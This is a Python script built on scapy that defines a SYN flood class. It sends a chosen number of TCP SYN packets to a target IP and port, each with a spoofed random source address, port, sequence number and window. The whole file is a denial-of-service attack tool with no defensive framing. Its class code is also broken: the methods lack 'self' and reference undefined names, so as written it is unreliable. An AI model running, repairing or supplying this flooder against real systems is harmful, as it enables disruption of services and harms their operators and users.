from pip._vendor.distlib.compat import raw_input
from scapy.all import *
from scapy.layers.inet import IP, TCP
import os
import sys
import random


class SynFlood():

        def __init__(self, target_ip, target_port, packet_number):

                self.target_ip = target_ip
                self.target_port = target_port
                self.packet_number = packet_number

        def start_attack():
                SYN_Flood(target_ip, target_port, packet_number)

        def SYN_Flood(targetIP, targetPort, counter):
                total = 0 # total number of packets sent to the target
                print("Packets are being sent to the target ...")
                for x in range(0, counter):
                        s_port = randInt()
                        s_eq = randInt()
                        w_indow = randInt()

                        # randomly generate all of these values (s_port, s_eq, w_indow using randInt() function

                        IP_Packet = IP()
                        IP_Packet.src = randomIP()

                        # randomly generate IP address to be sending packets from

                        IP_Packet.dst = targetIP

                        TCP_Packet = TCP()
                        TCP_Packet.sport = s_port
                        TCP_Packet.dport = targetPort
                        TCP_Packet.flags = "S"
                        TCP_Packet.seq = s_eq
                        TCP_Packet.window = w_indow

                        send(IP_Packet / TCP_Packet, verbose=0)
                        total += 1
                sys.stdout.write("\nTotal packets sent to target : %i\n" % total)

        def randomIP():
                ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
                return ip

        def randInt():
                x = random.randint(1000, 9000)
                return x
